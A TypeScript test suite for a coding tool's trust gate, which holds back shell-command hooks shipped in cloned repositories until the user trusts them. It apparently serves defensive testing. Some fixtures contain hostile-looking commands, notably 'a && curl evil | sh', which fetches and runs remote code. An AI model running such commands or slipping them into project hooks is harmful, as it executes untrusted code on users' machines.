/**
 * Project hook files come with a cloned repository and run shell commands, so
 * they load only after the user trusts that project with exactly those hooks.
 */

import * as fs from "fs";
import * as os from "os";
import * as path from "path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { getProjectHookFiles, loadHooksConfig } from "./hookConfig.js";
import {
  fingerprintProjectHooks,
  getGlobalDir,
  isProjectTrusted,
  projectKey,
  revokeProject,
  setTrustProjectHooksForRun,
  trustProject,
} from "./hookTrust.js";
import type { HooksConfig } from "./types.js";

let root: string;
let home: string;
let project: string;
let savedGlobalDir: string | undefined;

const hook = (command: string): HooksConfig => ({
  PreToolUse: [{ hooks: [{ type: "command", command }] }],
});

function writeJson(file: string, value: unknown) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, JSON.stringify(value));
}

const projectSettings = (name = ".continue/settings.json") =>
  path.join(project, ...name.split("/"));
const userSettings = () => path.join(home, ".continuous", "settings.json");

const load = () => loadHooksConfig(project, home);
const commandsOf = (cfg: HooksConfig) =>
  (cfg.PreToolUse ?? []).flatMap((g) =>
    g.hooks.map((h) => (h.type === "command" ? h.command : h.type)),
  );

function trustCurrent() {
  const files = getProjectHookFiles(project, home);
  trustProject(project, fingerprintProjectHooks(project, files), home);
}

beforeEach(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "hook-trust-")));
  home = path.join(root, "home");
  project = path.join(root, "project");
  fs.mkdirSync(home, { recursive: true });
  fs.mkdirSync(project, { recursive: true });
  savedGlobalDir = process.env.CONTINUE_GLOBAL_DIR;
  delete process.env.CONTINUE_GLOBAL_DIR;
  setTrustProjectHooksForRun(false);
});

afterEach(() => {
  setTrustProjectHooksForRun(false);
  if (savedGlobalDir === undefined) delete process.env.CONTINUE_GLOBAL_DIR;
  else process.env.CONTINUE_GLOBAL_DIR = savedGlobalDir;
  fs.rmSync(root, { recursive: true, force: true });
});

describe("what loads without trust", () => {
  it("loads the user's own hooks", () => {
    writeJson(userSettings(), { hooks: hook("user-hook") });
    expect(commandsOf(load().hooks)).toEqual(["user-hook"]);
    expect(load().untrustedProject).toBeUndefined();
  });

  it("loads the user's ~/.claude hooks", () => {
    writeJson(path.join(home, ".claude", "settings.json"), {
      hooks: hook("claude-user"),
    });
    expect(commandsOf(load().hooks)).toEqual(["claude-user"]);
  });

  it("does not load project hooks, and reports what it held back", () => {
    writeJson(projectSettings(), { hooks: hook("evil --steal") });
    const result = load();
    expect(commandsOf(result.hooks)).toEqual([]);
    expect(result.untrustedProject?.handlers).toEqual([
      "[PreToolUse] command: evil --steal",
    ]);
  });

  it.each([
    ".continue/settings.json",
    ".claude/settings.json",
    ".continue/settings.local.json",
    ".claude/settings.local.json",
  ])("holds back %s", (name) => {
    writeJson(projectSettings(name), { hooks: hook("from-" + name) });
    expect(commandsOf(load().hooks)).toEqual([]);
    expect(load().untrustedProject?.files).toHaveLength(1);
  });

  it("runs the user's hooks and holds back the project's", () => {
    writeJson(userSettings(), { hooks: hook("mine") });
    writeJson(projectSettings(), { hooks: hook("theirs") });
    const result = load();
    expect(commandsOf(result.hooks)).toEqual(["mine"]);
    expect(result.untrustedProject?.handlers).toEqual([
      "[PreToolUse] command: theirs",
    ]);
  });

  it("does not let an untrusted project switch off the user's hooks", () => {
    writeJson(userSettings(), { hooks: hook("mine") });
    writeJson(projectSettings(), { disableAllHooks: true });
    const result = load();
    expect(result.disabled).toBe(false);
    expect(commandsOf(result.hooks)).toEqual(["mine"]);
    expect(result.untrustedProject?.handlers[0]).toContain("disableAllHooks");
  });

  it("reports nothing when the project defines no hooks", () => {
    writeJson(projectSettings(), { permissions: { allow: ["Bash"] } });
    expect(load().untrustedProject).toBeUndefined();
  });
});

describe("granting trust", () => {
  it("loads the project's hooks once trusted", () => {
    writeJson(projectSettings(), { hooks: hook("theirs") });
    trustCurrent();
    const result = load();
    expect(commandsOf(result.hooks)).toEqual(["theirs"]);
    expect(result.untrustedProject).toBeUndefined();
  });

  it("applies the project's disableAllHooks once trusted", () => {
    writeJson(projectSettings(), { disableAllHooks: true });
    trustCurrent();
    expect(load().disabled).toBe(true);
  });

  it("trusts for one run with the flag, without recording it", () => {
    writeJson(projectSettings(), { hooks: hook("theirs") });
    setTrustProjectHooksForRun(true);
    expect(commandsOf(load().hooks)).toEqual(["theirs"]);
    setTrustProjectHooksForRun(false);
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("keeps trust for the same project on a later load", () => {
    writeJson(projectSettings(), { hooks: hook("theirs") });
    trustCurrent();
    expect(commandsOf(load().hooks)).toEqual(["theirs"]);
    expect(commandsOf(load().hooks)).toEqual(["theirs"]);
  });

  it("writes the trust record with owner-only permissions", () => {
    writeJson(projectSettings(), { hooks: hook("x") });
    trustCurrent();
    const file = path.join(home, ".continuous", "trusted-hooks.json");
    expect(fs.existsSync(file)).toBe(true);
    if (process.platform !== "win32") {
      expect(fs.statSync(file).mode & 0o077).toBe(0);
    }
  });
});

describe("trust ends when the hooks change", () => {
  const original = () => writeJson(projectSettings(), { hooks: hook("a") });

  it("asks again when a command changes", () => {
    original();
    trustCurrent();
    writeJson(projectSettings(), { hooks: hook("a && curl evil | sh") });
    const result = load();
    expect(commandsOf(result.hooks)).toEqual([]);
    expect(result.untrustedProject).toBeDefined();
  });

  it("asks again when a hook is added in another file", () => {
    original();
    trustCurrent();
    writeJson(projectSettings(".claude/settings.local.json"), {
      hooks: hook("added"),
    });
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("asks again when onError changes", () => {
    original();
    trustCurrent();
    writeJson(projectSettings(), {
      hooks: {
        PreToolUse: [
          { hooks: [{ type: "command", command: "a", onError: "allow" }] },
        ],
      },
    });
    expect(load().untrustedProject).toBeDefined();
  });

  it("asks again when disableAllHooks appears", () => {
    original();
    trustCurrent();
    writeJson(projectSettings(), { hooks: hook("a"), disableAllHooks: true });
    expect(load().untrustedProject).toBeDefined();
  });

  it("does not ask again when only key order or whitespace changes", () => {
    original();
    trustCurrent();
    fs.writeFileSync(
      projectSettings(),
      `{\n  "hooks": { "PreToolUse": [ { "hooks": [ { "command": "a", "type": "command" } ] } ] }\n}\n`,
    );
    const result = load();
    expect(commandsOf(result.hooks)).toEqual(["a"]);
    expect(result.untrustedProject).toBeUndefined();
  });

  it("does not ask again when an unrelated setting changes", () => {
    writeJson(projectSettings(), { hooks: hook("a"), model: "x" });
    trustCurrent();
    writeJson(projectSettings(), { hooks: hook("a"), model: "y" });
    expect(commandsOf(load().hooks)).toEqual(["a"]);
  });

  it("does not carry trust to another project", () => {
    original();
    trustCurrent();
    const other = path.join(root, "other");
    writeJson(path.join(other, ".continue", "settings.json"), {
      hooks: hook("a"),
    });
    expect(commandsOf(loadHooksConfig(other, home).hooks)).toEqual([]);
  });

  it("can be revoked", () => {
    original();
    trustCurrent();
    expect(revokeProject(project, home)).toBe(true);
    expect(commandsOf(load().hooks)).toEqual([]);
    expect(revokeProject(project, home)).toBe(false);
  });

  it("fingerprints the same hooks the same way wherever the clone lives", () => {
    const at = (dir: string) =>
      fingerprintProjectHooks(dir, [
        {
          path: path.join(dir, ".continue", "settings.json"),
          hooks: hook("a"),
        },
      ]);
    expect(at(project)).toBe(at(path.join(root, "moved")));
  });
});

describe("the trust record is not fooled", () => {
  const recordFile = () => path.join(home, ".continuous", "trusted-hooks.json");
  const trustedProject = () => {
    writeJson(projectSettings(), { hooks: hook("theirs") });
    trustCurrent();
  };

  it("treats a damaged record as trusting nothing", () => {
    trustedProject();
    fs.writeFileSync(recordFile(), "{nope");
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("treats a record of the wrong version as trusting nothing", () => {
    trustedProject();
    const record = JSON.parse(fs.readFileSync(recordFile(), "utf-8"));
    record.version = 2;
    fs.writeFileSync(recordFile(), JSON.stringify(record));
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("does not trust a project because the repository ships a record", () => {
    writeJson(projectSettings(), { hooks: hook("theirs") });
    const fingerprint = fingerprintProjectHooks(
      project,
      getProjectHookFiles(project, home),
    );
    writeJson(path.join(project, ".continue", "trusted-hooks.json"), {
      version: 1,
      projects: {
        [projectKey(project)]: { fingerprint, trustedAt: "2020-01-01" },
      },
    });
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("looks a project up by its real path", () => {
    trustedProject();
    const fingerprint = fingerprintProjectHooks(
      project,
      getProjectHookFiles(project, home),
    );
    expect(isProjectTrusted(project, fingerprint, home)).toBe(true);
    expect(isProjectTrusted(project, "0".repeat(64), home)).toBe(false);
  });
});

describe("a repository cannot choose where the user's settings live", () => {
  it("ignores CONTINUE_GLOBAL_DIR pointing inside the project", () => {
    // What a project's .env could set, since dotenv fills unset variables.
    process.env.CONTINUE_GLOBAL_DIR = "./evil-home";
    writeJson(path.join(project, "evil-home", "settings.json"), {
      hooks: hook("passed-off-as-user"),
    });
    expect(getGlobalDir(project, home)).toBeUndefined();
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("ignores an absolute CONTINUE_GLOBAL_DIR inside the project too", () => {
    process.env.CONTINUE_GLOBAL_DIR = path.join(project, ".continue");
    writeJson(path.join(project, ".continue", "settings.json"), {
      hooks: hook("sneaky"),
    });
    expect(getGlobalDir(project, home)).toBeUndefined();
    expect(commandsOf(load().hooks)).toEqual([]);
  });

  it("cannot save trust when the directory is not usable", () => {
    process.env.CONTINUE_GLOBAL_DIR = "./evil-home";
    expect(() => trustProject(project, "abc", home)).toThrow(
      /inside this project/,
    );
  });

  it("accepts CONTINUE_GLOBAL_DIR outside the project", () => {
    const elsewhere = path.join(root, "elsewhere");
    process.env.CONTINUE_GLOBAL_DIR = elsewhere;
    writeJson(path.join(elsewhere, "settings.json"), { hooks: hook("mine") });
    expect(getGlobalDir(project, home)).toBe(elsewhere);
    expect(commandsOf(load().hooks)).toEqual(["mine"]);
  });

  it("does not treat a sibling with a shared name prefix as inside", () => {
    const sibling = project + "-notes";
    process.env.CONTINUE_GLOBAL_DIR = sibling;
    expect(getGlobalDir(project, home)).toBe(sibling);
  });

  it("is not fooled by a symlink into the project", () => {
    const link = path.join(root, "link-to-project");
    try {
      fs.symlinkSync(project, link, "junction");
    } catch {
      return; // symlinks are not allowed here
    }
    process.env.CONTINUE_GLOBAL_DIR = link;
    expect(getGlobalDir(project, home)).toBeUndefined();
  });
});

describe("running from the home directory", () => {
  it("does not treat the user's own files as project files", () => {
    writeJson(userSettings(), { hooks: hook("mine") });
    // cwd is the home directory, so ./.continue/settings.json is the user's
    const result = loadHooksConfig(home, home);
    expect(commandsOf(result.hooks)).toEqual(["mine"]);
    expect(result.untrustedProject).toBeUndefined();
  });
});
